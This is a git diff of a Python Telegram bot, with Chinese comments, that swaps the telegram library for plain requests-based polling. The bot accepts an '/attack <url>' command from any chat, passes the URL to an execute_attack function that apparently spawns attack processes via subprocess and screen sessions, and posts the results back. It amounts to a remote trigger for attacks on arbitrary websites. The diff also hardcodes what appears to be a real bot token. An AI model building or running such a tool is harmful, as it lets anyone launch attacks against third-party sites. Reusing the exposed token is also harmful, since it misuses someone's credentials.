@@ -1,12 +1,11 @@
-import os
+import requests
 import random
 import string
 import subprocess
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # 机器人Token
 BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"
+BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 # 随机生成screen名称
 def generate_screen_name():
@@ -25,32 +24,48 @@ def execute_attack(url: str):
         results.append(f"Error: {e}")
     return "\n".join(results)
 
-# 处理 /attack 命令
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /attack <url>")
-        return
+# 获取更新消息
+def get_updates(offset=None):
+    params = {"offset": offset, "timeout": 30}
+    response = requests.get(f"{BASE_URL}/getUpdates", params=params)
+    return response.json()
 
-    url = context.args[0]
-    await update.message.reply_text(f"Starting attack on {url}...")
+# 发送消息
+def send_message(chat_id, text):
+    data = {"chat_id": chat_id, "text": text}
+    requests.post(f"{BASE_URL}/sendMessage", data=data)
 
-    # 执行攻击
-    results = execute_attack(url)
+# 主循环
+def main():
+    last_update_id = None
 
-    # 返回结果
-    await update.message.reply_text(f"Attack results:\n{results}")
+    while True:
+        updates = get_updates(offset=last_update_id)
 
-# 主函数
-async def main():
-    # 创建机器人应用程序
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+        if "result" in updates and updates["result"]:
+            for update in updates["result"]:
+                last_update_id = update["update_id"] + 1
 
-    # 注册命令处理器
-    application.add_handler(CommandHandler("attack", attack_command))
+                # 获取消息和发送者信息
+                message = update.get("message", {})
+                chat_id = message.get("chat", {}).get("id")
+                text = message.get("text", "")
 
-    # 启动机器人
-    await application.run_polling()
+                # 检测命令 /attack
+                if text.startswith("/attack"):
+                    parts = text.split()
+                    if len(parts) != 2:
+                        send_message(chat_id, "Usage: /attack <url>")
+                        continue
+
+                    url = parts[1]
+                    send_message(chat_id, f"Starting attack on {url}...")
+
+                    # 执行攻击命令
+                    results = execute_attack(url)
+
+                    # 返回结果
+                    send_message(chat_id, f"Attack results:\n{results}")
 
 if __name__ == "__main__":
-    import asyncio
-    asyncio.run(main())
+    main()
